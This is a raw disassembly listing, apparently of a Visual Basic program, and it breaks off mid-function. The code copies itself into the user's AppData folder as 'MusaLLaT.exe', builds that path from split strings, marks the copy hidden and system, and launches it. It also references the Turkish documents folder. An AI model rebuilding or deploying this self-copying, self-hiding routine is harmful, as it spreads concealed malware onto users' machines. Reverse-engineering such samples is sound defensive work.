  push ebp
  mov ebp, esp
  sub esp, 00000018h
  push 00403896h ; ext_4010EC
  mov eax, fs:[00000000h]
  push eax
  mov fs:[00000000h], esp
  mov eax, 000001F8h
  call 00403890h ; ext_40109C
  push ebx
  push esi
  push edi
  mov var_18, esp
  mov var_14, 004012B0h ; "'"
  mov eax, Me
  and eax, 00000001h
  mov var_10, eax
  mov ecx, Me
  and ecx, FFFFFFFEh
  mov Me, ecx
  mov var_C, 00000000h
  mov edx, Me
  mov eax, [edx]
  mov ecx, Me
  push ecx
  call [eax+00000004h]
  mov var_4, 00000001h
  mov var_4, 00000002h
  push FFFFFFFFh
  call [00401070h]
  mov var_4, 00000003h
  cmp [00460558h], 00000000h
  jnz 0043C2B7h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_18C, 00460558h
  jmp 0043C2C1h
  mov var_18C, 00460558h
  mov edx, var_18C
  mov eax, [edx]
  mov var_150, eax
  lea ecx, var_C8
  push ecx
  mov edx, var_150
  mov eax, [edx]
  mov ecx, var_150
  push ecx
  call [eax+00000014h]
  fnclex
  mov var_154, eax
  cmp var_154, 00000000h
  jge 0043C31Ch
  push 00000014h
  push 00418ED0h
  mov edx, var_150
  push edx
  mov eax, var_154
  push eax
  call [00401058h]
  mov var_190, eax
  jmp 0043C326h
  mov var_190, 00000000h
  mov ecx, var_C8
  mov var_158, ecx
  lea edx, var_140
  push edx
  mov eax, var_158
  mov ecx, [eax]
  mov edx, var_158
  push edx
  call [ecx+00000068h]
  fnclex
  mov var_15C, eax
  cmp var_15C, 00000000h
  jge 0043C37Fh
  push 00000068h
  push 00418EF0h
  mov eax, var_158
  push eax
  mov ecx, var_15C
  push ecx
  call [00401058h]
  mov var_194, eax
  jmp 0043C389h
  mov var_194, 00000000h
  mov dx, var_140
  mov var_160, dx
  lea ecx, var_C8
  call [004011D4h]
  movsx eax, var_160
  test eax, eax
  jz 0043C3BBh
  mov var_4, 00000004h
  call [00401020h]
  mov var_4, 00000006h
  lea ecx, var_DC
  push ecx
  call 0045B890h
  lea ecx, var_DC
  call [00401014h]
  mov var_4, 00000007h
  call 0045BCD0h
  mov var_4, 00000008h
  cmp [00460558h], 00000000h
  jnz 0043C412h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_198, 00460558h
  jmp 0043C41Ch
  mov var_198, 00460558h
  mov edx, var_198
  mov eax, [edx]
  mov var_150, eax
  lea ecx, var_C8
  push ecx
  mov edx, var_150
  mov eax, [edx]
  mov ecx, var_150
  push ecx
  call [eax+00000014h]
  fnclex
  mov var_154, eax
  cmp var_154, 00000000h
  jge 0043C477h
  push 00000014h
  push 00418ED0h
  mov edx, var_150
  push edx
  mov eax, var_154
  push eax
  call [00401058h]
  mov var_19C, eax
  jmp 0043C481h
  mov var_19C, 00000000h
  mov ecx, var_C8
  mov var_158, ecx
  lea edx, var_A4
  push edx
  mov eax, var_158
  mov ecx, [eax]
  mov edx, var_158
  push edx
  call [ecx+00000050h]
  fnclex
  mov var_15C, eax
  cmp var_15C, 00000000h
  jge 0043C4DAh
  push 00000050h
  push 00418EF0h
  mov eax, var_158
  push eax
  mov ecx, var_15C
  push ecx
  call [00401058h]
  mov var_1A0, eax
  jmp 0043C4E4h
  mov var_1A0, 00000000h
  mov edx, var_A4
  mov var_188, edx
  mov var_A4, 00000000h
  mov eax, var_188
  mov var_F4, eax
  mov var_FC, 00008008h
  push 00419238h
  push 00419240h
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419240h
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 00419248h ; "da"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 00419254h ; "ta"
  call [00401044h]
  mov var_D4, eax
  mov var_DC, 00000008h
  lea ecx, var_DC
  push ecx
  lea edx, var_EC
  push edx
  call [00401064h]
  lea eax, var_FC
  push eax
  lea ecx, var_EC
  push ecx
  call [004010B8h]
  mov var_160, ax
  lea edx, var_B0
  push edx
  lea eax, var_AC
  push eax
  lea ecx, var_A8
  push ecx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  lea ecx, var_C8
  call [004011D4h]
  lea edx, var_EC
  push edx
  lea eax, var_FC
  push eax
  lea ecx, var_DC
  push ecx
  push 00000003h
  call [00401024h]
  add esp, 00000010h
  movsx edx, var_160
  test edx, edx
  jz 0043CCDAh
  mov var_4, 00000009h
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000348h]
  push eax
  lea eax, var_C8
  push eax
  call [00401078h]
  mov var_150, eax
  push FFFFFFFFh
  mov ecx, var_150
  mov edx, [ecx]
  mov eax, var_150
  push eax
  call [edx+0000005Ch]
  fnclex
  mov var_154, eax
  cmp var_154, 00000000h
  jge 0043C67Ah
  push 0000005Ch
  push 0041925Ch
  mov ecx, var_150
  push ecx
  mov edx, var_154
  push edx
  call [00401058h]
  mov var_1A4, eax
  jmp 0043C684h
  mov var_1A4, 00000000h
  lea ecx, var_C8
  call [004011D4h]
  mov var_4, 0000000Ah
  mov var_114, 00000000h
  mov var_11C, 0000000Bh
  lea edx, var_11C
  lea ecx, var_70
  call [00401010h]
  mov var_4, 0000000Bh
  mov var_114, 00000000h
  mov var_11C, 0000000Bh
  lea edx, var_11C
  lea ecx, var_80
  call [00401010h]
  mov var_4, 0000000Ch
  mov var_114, 00000000h
  mov var_11C, 0000000Bh
  lea edx, var_11C
  lea ecx, var_90
  call [00401010h]
  mov var_4, 0000000Dh
  mov var_114, 00000000h
  mov var_11C, 0000000Bh
  lea edx, var_11C
  lea ecx, var_A0
  call [00401010h]
  mov var_4, 0000000Eh
  mov var_114, 00000000h
  mov var_11C, 0000000Bh
  lea edx, var_11C
  lea ecx, var_30
  call [00401010h]
  mov var_4, 0000000Fh
  mov var_114, 00000000h
  mov var_11C, 0000000Bh
  lea edx, var_11C
  lea ecx, var_50
  call [00401010h]
  mov var_4, 00000010h
  mov var_114, 00000000h
  mov var_11C, 0000000Bh
  lea edx, var_11C
  lea ecx, var_40
  call [00401010h]
  mov var_4, 00000011h
  mov var_114, 00000000h
  mov var_11C, 0000000Bh
  lea edx, var_11C
  lea ecx, var_60
  call [00401010h]
  mov var_4, 00000012h
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000310h]
  push eax
  lea eax, var_C8
  push eax
  call [00401078h]
  mov var_150, eax
  mov var_134, 80020004h
  mov var_13C, 0000000Ah
  mov var_114, 00419270h ; "userprofile"
  mov var_11C, 00000008h
  lea edx, var_11C
  lea ecx, var_DC
  call [0040118Ch]
  lea ecx, var_DC
  push ecx
  lea edx, var_EC
  push edx
  call [00401064h]
  mov var_124, 0041928Ch ; "\Belgelerim\"
  mov var_12C, 00000008h
  mov eax, 00000010h
  call 00403890h ; ext_40109C
  mov eax, esp
  mov ecx, var_13C
  mov [eax], ecx
  mov edx, var_138
  mov [eax+00000004h], edx
  mov ecx, var_134
  mov [eax+00000008h], ecx
  mov edx, var_130
  mov [eax+0000000Ch], edx
  lea eax, var_EC
  push eax
  lea ecx, var_12C
  push ecx
  lea edx, var_FC
  push edx
  call [00401180h]
  push eax
  lea eax, var_A4
  push eax
  call [00401118h]
  push eax
  mov ecx, var_150
  mov edx, [ecx]
  mov eax, var_150
  push eax
  call [edx+000001ECh]
  fnclex
  mov var_154, eax
  cmp var_154, 00000000h
  jge 0043C917h
  push 000001ECh
  push 00418DC4h
  mov ecx, var_150
  push ecx
  mov edx, var_154
  push edx
  call [00401058h]
  mov var_1A8, eax
  jmp 0043C921h
  mov var_1A8, 00000000h
  lea ecx, var_A4
  call [004011CCh]
  lea ecx, var_C8
  call [004011D4h]
  lea eax, var_FC
  push eax
  lea ecx, var_EC
  push ecx
  lea edx, var_DC
  push edx
  push 00000003h
  call [00401024h]
  add esp, 00000010h
  mov var_4, 00000013h
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000310h]
  push eax
  lea eax, var_C8
  push eax
  call [00401078h]
  mov var_150, eax
  mov var_114, 80020004h
  mov var_11C, 0000000Ah
  mov eax, 00000010h
  call 00403890h ; ext_40109C
  mov ecx, esp
  mov edx, var_11C
  mov [ecx], edx
  mov eax, var_118
  mov [ecx+00000004h], eax
  mov edx, var_114
  mov [ecx+00000008h], edx
  mov eax, var_110
  mov [ecx+0000000Ch], eax
  push 004192ACh
  mov ecx, var_150
  mov edx, [ecx]
  mov eax, var_150
  push eax
  call [edx+000001ECh]
  fnclex
  mov var_154, eax
  cmp var_154, 00000000h
  jge 0043CA17h
  push 000001ECh
  push 00418DC4h
  mov ecx, var_150
  push ecx
  mov edx, var_154
  push edx
  call [00401058h]
  mov var_1AC, eax
  jmp 0043CA21h
  mov var_1AC, 00000000h
  lea ecx, var_C8
  call [004011D4h]
  mov var_4, 00000014h
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000304h]
  push eax
  lea eax, var_C8
  push eax
  call [00401078h]
  mov var_150, eax
  push FFFFFFFFh
  mov ecx, var_150
  mov edx, [ecx]
  mov eax, var_150
  push eax
  call [edx+0000005Ch]
  fnclex
  mov var_154, eax
  cmp var_154, 00000000h
  jge 0043CA9Fh
  push 0000005Ch
  push 0041925Ch
  mov ecx, var_150
  push ecx
  mov edx, var_154
  push edx
  call [00401058h]
  mov var_1B0, eax
  jmp 0043CAA9h
  mov var_1B0, 00000000h
  lea ecx, var_C8
  call [004011D4h]
  mov var_4, 00000015h
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000324h]
  push eax
  lea eax, var_C8
  push eax
  call [00401078h]
  mov var_150, eax
  push FFFFFFFFh
  mov ecx, var_150
  mov edx, [ecx]
  mov eax, var_150
  push eax
  call [edx+0000005Ch]
  fnclex
  mov var_154, eax
  cmp var_154, 00000000h
  jge 0043CB27h
  push 0000005Ch
  push 0041925Ch
  mov ecx, var_150
  push ecx
  mov edx, var_154
  push edx
  call [00401058h]
  mov var_1B4, eax
  jmp 0043CB31h
  mov var_1B4, 00000000h
  lea ecx, var_C8
  call [004011D4h]
  mov var_4, 00000016h
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000330h]
  push eax
  lea eax, var_C8
  push eax
  call [00401078h]
  mov var_150, eax
  push FFFFFFFFh
  mov ecx, var_150
  mov edx, [ecx]
  mov eax, var_150
  push eax
  call [edx+0000005Ch]
  fnclex
  mov var_154, eax
  cmp var_154, 00000000h
  jge 0043CBAFh
  push 0000005Ch
  push 0041925Ch
  mov ecx, var_150
  push ecx
  mov edx, var_154
  push edx
  call [00401058h]
  mov var_1B8, eax
  jmp 0043CBB9h
  mov var_1B8, 00000000h
  lea ecx, var_C8
  call [004011D4h]
  mov var_4, 00000017h
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+0000033Ch]
  push eax
  lea eax, var_C8
  push eax
  call [00401078h]
  mov var_150, eax
  push FFFFFFFFh
  mov ecx, var_150
  mov edx, [ecx]
  mov eax, var_150
  push eax
  call [edx+0000005Ch]
  fnclex
  mov var_154, eax
  cmp var_154, 00000000h
  jge 0043CC37h
  push 0000005Ch
  push 0041925Ch
  mov ecx, var_150
  push ecx
  mov edx, var_154
  push edx
  call [00401058h]
  mov var_1BC, eax
  jmp 0043CC41h
  mov var_1BC, 00000000h
  lea ecx, var_C8
  call [004011D4h]
  mov var_4, 00000018h
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000320h]
  push eax
  lea eax, var_C8
  push eax
  call [00401078h]
  mov var_150, eax
  push FFFFFFFFh
  mov ecx, var_150
  mov edx, [ecx]
  mov eax, var_150
  push eax
  call [edx+0000005Ch]
  fnclex
  mov var_154, eax
  cmp var_154, 00000000h
  jge 0043CCBFh
  push 0000005Ch
  push 0041925Ch
  mov ecx, var_150
  push ecx
  mov edx, var_154
  push edx
  call [00401058h]
  mov var_1C0, eax
  jmp 0043CCC9h
  mov var_1C0, 00000000h
  lea ecx, var_C8
  call [004011D4h]
  jmp 0043DC85h
  mov var_4, 00000019h
  cmp [00460558h], 00000000h
  jnz 0043CD06h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_1C4, 00460558h
  jmp 0043CD10h
  mov var_1C4, 00460558h
  mov eax, var_1C4
  mov ecx, [eax]
  mov var_150, ecx
  lea edx, var_C8
  push edx
  mov eax, var_150
  mov ecx, [eax]
  mov edx, var_150
  push edx
  call [ecx+00000014h]
  fnclex
  mov var_154, eax
  cmp var_154, 00000000h
  jge 0043CD6Bh
  push 00000014h
  push 00418ED0h
  mov eax, var_150
  push eax
  mov ecx, var_154
  push ecx
  call [00401058h]
  mov var_1C8, eax
  jmp 0043CD75h
  mov var_1C8, 00000000h
  mov edx, var_C8
  mov var_158, edx
  lea eax, var_A4
  push eax
  mov ecx, var_158
  mov edx, [ecx]
  mov eax, var_158
  push eax
  call [edx+00000050h]
  fnclex
  mov var_15C, eax
  cmp var_15C, 00000000h
  jge 0043CDCEh
  push 00000050h
  push 00418EF0h
  mov ecx, var_158
  push ecx
  mov edx, var_15C
  push edx
  call [00401058h]
  mov var_1CC, eax
  jmp 0043CDD8h
  mov var_1CC, 00000000h
  cmp [00460558h], 00000000h
  jnz 0043CDFDh
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_1D0, 00460558h
  jmp 0043CE07h
  mov var_1D0, 00460558h
  mov eax, var_1D0
  mov ecx, [eax]
  mov var_160, ecx
  lea edx, var_CC
  push edx
  mov eax, var_160
  mov ecx, [eax]
  mov edx, var_160
  push edx
  call [ecx+00000014h]
  fnclex
  mov var_164, eax
  cmp var_164, 00000000h
  jge 0043CE62h
  push 00000014h
  push 00418ED0h
  mov eax, var_160
  push eax
  mov ecx, var_164
  push ecx
  call [00401058h]
  mov var_1D4, eax
  jmp 0043CE6Ch
  mov var_1D4, 00000000h
  mov edx, var_CC
  mov var_168, edx
  lea eax, var_A8
  push eax
  mov ecx, var_168
  mov edx, [ecx]
  mov eax, var_168
  push eax
  call [edx+00000058h]
  fnclex
  mov var_16C, eax
  cmp var_16C, 00000000h
  jge 0043CEC5h
  push 00000058h
  push 00418EF0h
  mov ecx, var_168
  push ecx
  mov edx, var_16C
  push edx
  call [00401058h]
  mov var_1D8, eax
  jmp 0043CECFh
  mov var_1D8, 00000000h
  mov eax, var_A4
  push eax
  call [00401018h]
  xor ebx, ebx
  cmp eax, 00000003h
  setz bl
  neg ebx
  mov ecx, var_A8
  push ecx
  push 004192B8h ; "MusaLLaT"
  call [004010B0h]
  neg eax
  sbb eax, eax
  inc eax
  neg eax
  and bx, ax
  mov var_170, bx
  lea edx, var_A8
  push edx
  lea eax, var_A4
  push eax
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  lea ecx, var_CC
  push ecx
  lea edx, var_C8
  push edx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  movsx eax, var_170
  test eax, eax
  jz 0043D6C6h
  mov var_4, 0000001Ah
  lea ecx, var_144
  push ecx
  mov edx, Me
  mov eax, [edx]
  mov ecx, Me
  push ecx
  call [eax+00000058h]
  fnclex
  mov var_150, eax
  cmp var_150, 00000000h
  jge 0043CF95h
  push 00000058h
  push 00418904h
  mov edx, Me
  push edx
  mov eax, var_150
  push eax
  call [00401058h]
  mov var_1DC, eax
  jmp 0043CF9Fh
  mov var_1DC, 00000000h
  cmp [00460558h], 00000000h
  jnz 0043CFC4h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_1E0, 00460558h
  jmp 0043CFCEh
  mov var_1E0, 00460558h
  mov ecx, var_1E0
  mov edx, [ecx]
  mov var_154, edx
  lea eax, var_C8
  push eax
  mov ecx, var_154
  mov edx, [ecx]
  mov eax, var_154
  push eax
  call [edx+00000014h]
  fnclex
  mov var_158, eax
  cmp var_158, 00000000h
  jge 0043D029h
  push 00000014h
  push 00418ED0h
  mov ecx, var_154
  push ecx
  mov edx, var_158
  push edx
  call [00401058h]
  mov var_1E4, eax
  jmp 0043D033h
  mov var_1E4, 00000000h
  mov eax, var_C8
  mov var_15C, eax
  lea ecx, var_A4
  push ecx
  mov edx, var_15C
  mov eax, [edx]
  mov ecx, var_15C
  push ecx
  call [eax+00000050h]
  fnclex
  mov var_160, eax
  cmp var_160, 00000000h
  jge 0043D08Ch
  push 00000050h
  push 00418EF0h
  mov edx, var_15C
  push edx
  mov eax, var_160
  push eax
  call [00401058h]
  mov var_1E8, eax
  jmp 0043D096h
  mov var_1E8, 00000000h
  push 00000001h
  push 00000000h
  push 00000000h
  mov ecx, var_A4
  push ecx
  lea edx, var_AC
  push edx
  call [00401188h]
  push eax
  push 004192D0h ; "open"
  lea eax, var_A8
  push eax
  call [00401188h]
  push eax
  mov ecx, var_144
  push ecx
  call 00418C2Ch ; ShellExecute(%x1v, %x2v, %x3v, %x4v, %x5v, %x6v)
  call [00401054h]
  lea edx, var_AC
  push edx
  lea eax, var_A4
  push eax
  lea ecx, var_A8
  push ecx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  lea ecx, var_C8
  call [004011D4h]
  mov var_4, 0000001Bh
  cmp [00460558h], 00000000h
  jnz 0043D12Eh
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_1EC, 00460558h
  jmp 0043D138h
  mov var_1EC, 00460558h
  mov edx, var_1EC
  mov eax, [edx]
  mov var_150, eax
  lea ecx, var_C8
  push ecx
  mov edx, var_150
  mov eax, [edx]
  mov ecx, var_150
  push ecx
  call [eax+00000014h]
  fnclex
  mov var_154, eax
  cmp var_154, 00000000h
  jge 0043D193h
  push 00000014h
  push 00418ED0h
  mov edx, var_150
  push edx
  mov eax, var_154
  push eax
  call [00401058h]
  mov var_1F0, eax
  jmp 0043D19Dh
  mov var_1F0, 00000000h
  mov ecx, var_C8
  mov var_158, ecx
  lea edx, var_A4
  push edx
  mov eax, var_158
  mov ecx, [eax]
  mov edx, var_158
  push edx
  call [ecx+00000050h]
  fnclex
  mov var_15C, eax
  cmp var_15C, 00000000h
  jge 0043D1F6h
  push 00000050h
  push 00418EF0h
  mov eax, var_158
  push eax
  mov ecx, var_15C
  push ecx
  call [00401058h]
  mov var_1F4, eax
  jmp 0043D200h
  mov var_1F4, 00000000h
  cmp [00460558h], 00000000h
  jnz 0043D225h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_1F8, 00460558h
  jmp 0043D22Fh
  mov var_1F8, 00460558h
  mov edx, var_1F8
  mov eax, [edx]
  mov var_160, eax
  lea ecx, var_CC
  push ecx
  mov edx, var_160
  mov eax, [edx]
  mov ecx, var_160
  push ecx
  call [eax+00000014h]
  fnclex
  mov var_164, eax
  cmp var_164, 00000000h
  jge 0043D28Ah
  push 00000014h
  push 00418ED0h
  mov edx, var_160
  push edx
  mov eax, var_164
  push eax
  call [00401058h]
  mov var_1FC, eax
  jmp 0043D294h
  mov var_1FC, 00000000h
  mov ecx, var_CC
  mov var_168, ecx
  lea edx, var_A8
  push edx
  mov eax, var_168
  mov ecx, [eax]
  mov edx, var_168
  push edx
  call [ecx+00000058h]
  fnclex
  mov var_16C, eax
  cmp var_16C, 00000000h
  jge 0043D2EDh
  push 00000058h
  push 00418EF0h
  mov eax, var_168
  push eax
  mov ecx, var_16C
  push ecx
  call [00401058h]
  mov var_200, eax
  jmp 0043D2F7h
  mov var_200, 00000000h
  push 00419238h
  push 00419240h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  push 00419240h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B8
  call [004011ACh]
  push eax
  push 00419248h ; "da"
  call [00401044h]
  mov edx, eax
  lea ecx, var_BC
  call [004011ACh]
  push eax
  push 00419254h ; "ta"
  call [00401044h]
  mov var_D4, eax
  mov var_DC, 00000008h
  lea edx, var_DC
  push edx
  lea eax, var_EC
  push eax
  call [00401064h]
  mov var_114, 004192F0h ; "\MusaLLaT.exe"
  mov var_11C, 00000008h
  lea ecx, var_EC
  push ecx
  lea edx, var_11C
  push edx
  lea eax, var_FC
  push eax
  call [00401180h]
  push eax
  lea ecx, var_C4
  push ecx
  call [00401118h]
  push eax
  mov edx, var_A4
  push edx
  push 00418DA4h ; "\"
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  mov eax, var_A8
  push eax
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004192E0h ; ".exe"
  call [00401044h]
  mov edx, eax
  lea ecx, var_C0
  call [004011ACh]
  push eax
  call [00401158h]
  lea ecx, var_C4
  push ecx
  lea edx, var_C0
  push edx
  lea eax, var_BC
  push eax
  lea ecx, var_B8
  push ecx
  lea edx, var_B4
  push edx
  lea eax, var_B0
  push eax
  lea ecx, var_A8
  push ecx
  lea edx, var_AC
  push edx
  lea eax, var_A4
  push eax
  push 00000009h
  call [00401150h]
  add esp, 00000028h
  lea ecx, var_CC
  push ecx
  lea edx, var_C8
  push edx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  lea eax, var_FC
  push eax
  lea ecx, var_EC
  push ecx
  lea edx, var_DC
  push edx
  push 00000003h
  call [00401024h]
  add esp, 00000010h
  mov var_4, 0000001Ch
  push 00419238h
  push 00419240h
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 00419240h
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419248h ; "da"
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 00419254h ; "ta"
  call [00401044h]
  mov var_D4, eax
  mov var_DC, 00000008h
  lea eax, var_DC
  push eax
  lea ecx, var_EC
  push ecx
  call [00401064h]
  mov var_114, 004192F0h ; "\MusaLLaT.exe"
  mov var_11C, 00000008h
  push 00000006h
  lea edx, var_EC
  push edx
  lea eax, var_11C
  push eax
  lea ecx, var_FC
  push ecx
  call [00401180h]
  push eax
  lea edx, var_B0
  push edx
  call [00401118h]
  push eax
  call [004011D0h]
  lea eax, var_B0
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_A8
  push edx
  lea eax, var_A4
  push eax
  push 00000004h
  call [00401150h]
  add esp, 00000014h
  lea ecx, var_FC
  push ecx
  lea edx, var_EC
  push edx
  lea eax, var_DC
  push eax
  push 00000003h
  call [00401024h]
  add esp, 00000010h
  mov var_4, 0000001Dh
  push 00419238h
  push 00419240h
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 00419240h
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419248h ; "da"
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 00419254h ; "ta"
  call [00401044h]
  mov var_D4, eax
  mov var_DC, 00000008h
  lea ecx, var_DC
  push ecx
  lea edx, var_EC
  push edx
  call [00401064h]
  mov var_114, 004192F0h ; "\MusaLLaT.exe"
  mov var_11C, 00000008h
  push 00000002h
  lea eax, var_EC
  push eax
  lea ecx, var_11C
  push ecx
  lea edx, var_FC
  push edx
  call [00401180h]
  push eax
  call [004010DCh]
  fstp real8 ptr var_14C
  lea eax, var_AC
  push eax
  lea ecx, var_A8
  push ecx
  lea edx, var_A4
  push edx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  lea eax, var_FC
  push eax
  lea ecx, var_EC
  push ecx
  lea edx, var_DC
  push edx
  push 00000003h
  call [00401024h]
  add esp, 00000010h
  mov var_4, 0000001Eh
  call [00401020h]
  jmp 0043DC85h
  mov var_4, 00000020h
  cmp [00460558h], 00000000h
  jnz 0043D6F2h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_204, 00460558h
  jmp 0043D6FCh
  mov var_204, 00460558h
  mov eax, var_204
  mov ecx, [eax]
  mov var_150, ecx
  lea edx, var_C8
  push edx
  mov eax, var_150
  mov ecx, [eax]
  mov edx, var_150
  push edx
  call [ecx+00000014h]
  fnclex
  mov var_154, eax
  cmp var_154, 00000000h
  jge 0043D757h
  push 00000014h
  push 00418ED0h
  mov eax, var_150
  push eax
  mov ecx, var_154
  push ecx
  call [00401058h]
  mov var_208, eax
  jmp 0043D761h
  mov var_208, 00000000h
  mov edx, var_C8
  mov var_158, edx
  lea eax, var_A4
  push eax
  mov ecx, var_158
  mov edx, [ecx]
  mov eax, var_158
  push eax
  call [edx+00000050h]
  fnclex
  mov var_15C, eax
  cmp var_15C, 00000000h
  jge 0043D7BAh
  push 00000050h
  push 00418EF0h
  mov ecx, var_158
  push ecx
  mov edx, var_15C
  push edx
  call [00401058h]
  mov var_20C, eax
  jmp 0043D7C4h
  mov var_20C, 00000000h
  cmp [00460558h], 00000000h
  jnz 0043D7E9h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_210, 00460558h
  jmp 0043D7F3h
  mov var_210, 00460558h
  mov eax, var_210
  mov ecx, [eax]
  mov var_160, ecx
  lea edx, var_CC
  push edx
  mov eax, var_160
  mov ecx, [eax]
  mov edx, var_160
  push edx
  call [ecx+00000014h]
  fnclex
  mov var_164, eax
  cmp var_164, 00000000h
  jge 0043D84Eh
  push 00000014h
  push 00418ED0h
  mov eax, var_160
  push eax
  mov ecx, var_164
  push ecx
  call [00401058h]
  mov var_214, eax
  jmp 0043D858h
  mov var_214, 00000000h
  mov edx, var_CC
  mov var_168, edx
  lea eax, var_A8
  push eax
  mov ecx, var_168
  mov edx, [ecx]
  mov eax, var_168
  push eax
  call [edx+00000058h]
  fnclex
  mov var_16C, eax
  cmp var_16C, 00000000h
  jge 0043D8B1h
  push 00000058h
  push 00418EF0h
  mov ecx, var_168
  push ecx
  mov edx, var_16C
  push edx
  call [00401058h]
  mov var_218, eax
  jmp 0043D8BBh
  mov var_218, 00000000h
  push 00419238h
  push 00419240h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  push 00419240h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B8
  call [004011ACh]
  push eax
  push 00419248h ; "da"
  call [00401044h]
  mov edx, eax
  lea ecx, var_BC
  call [004011ACh]
  push eax
  push 00419254h ; "ta"
  call [00401044h]
  mov var_D4, eax
  mov var_DC, 00000008h
  lea eax, var_DC
  push eax
  lea ecx, var_EC
  push ecx
  call [00401064h]
  mov var_114, 004192F0h ; "\MusaLLaT.exe"
  mov var_11C, 00000008h
  lea edx, var_EC
  push edx
  lea eax, var_11C
  push eax
  lea ecx, var_FC
  push ecx
  call [00401180h]
  push eax
  lea edx, var_C4
  push edx
  call [00401118h]
  push eax
  mov eax, var_A4
  push eax
  push 00418DA4h ; "\"
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  mov ecx, var_A8
  push ecx
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004192E0h ; ".exe"
  call [00401044h]
  mov edx, eax
  lea ecx, var_C0
  call [004011ACh]
  push eax
  call [00401158h]
  lea edx, var_C4
  push edx
  lea eax, var_C0
  push eax
  lea ecx, var_BC
  push ecx
  lea edx, var_B8
  push edx
  lea eax, var_B4
  push eax
  lea ecx, var_B0
  push ecx
  lea edx, var_A8
  push edx
  lea eax, var_AC
  push eax
  lea ecx, var_A4
  push ecx
  push 00000009h
  call [00401150h]
  add esp, 00000028h
  lea edx, var_CC
  push edx
  lea eax, var_C8
  push eax
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  lea ecx, var_FC
  push ecx
  lea edx, var_EC
  push edx
  lea eax, var_DC
  push eax
  push 00000003h
  call [00401024h]
  add esp, 00000010h
  mov var_4, 00000021h
  push 00419238h
  push 00419240h
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 00419240h
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419248h ; "da"
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 00419254h ; "ta"
  call [00401044h]
  mov var_D4, eax
  mov var_DC, 00000008h
  lea ecx, var_DC
  push ecx
  lea edx, var_EC
  push edx
  call [00401064h]
  mov var_114, 004192F0h ; "\MusaLLaT.exe"
  mov var_11C, 00000008h
  push 00000006h
  lea eax, var_EC
  push eax
  lea ecx, var_11C
  push ecx
  lea edx, var_FC
  push edx
  call [00401180h]
  push eax
  lea eax, var_B0
  push eax
  call [00401118h]
  push eax
  call [004011D0h]
  lea ecx, var_B0
  push ecx
  lea edx, var_AC
  push edx
  lea eax, var_A8
  push eax
  lea ecx, var_A4
  push ecx
  push 00000004h
  call [00401150h]
  add esp, 00000014h
  lea edx, var_FC
  push edx
  lea eax, var_EC
  push eax
  lea ecx, var_DC
  push ecx
  push 00000003h
  call [00401024h]
  add esp, 00000010h
  mov var_4, 00000022h
  push 00419238h
  push 00419240h
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 00419240h
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419248h ; "da"
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 00419254h ; "ta"
  call [00401044h]
  mov var_D4, eax
  mov var_DC, 00000008h
  lea edx, var_DC
  push edx
  lea eax, var_EC
  push eax
  call [00401064h]
  mov var_114, 004192F0h ; "\MusaLLaT.exe"
  mov var_11C, 00000008h
  push 00000002h
  lea ecx, var_EC
  push ecx
  lea edx, var_11C
  push edx
